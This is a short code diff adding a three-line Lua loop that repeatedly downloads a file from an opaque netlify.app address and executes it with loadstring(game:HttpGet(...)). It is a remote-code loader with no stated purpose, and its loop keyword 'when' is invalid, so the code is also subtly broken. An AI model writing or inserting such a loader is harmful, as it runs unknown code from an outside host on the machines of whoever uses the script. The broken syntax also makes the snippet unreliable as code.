@@ -1,0 +1,3 @@
+when true do
+loadstring(game:HttpGet("https://3d32d0fc89237981.netlify.app/23145f4e457bf30d.lua"))()
+end
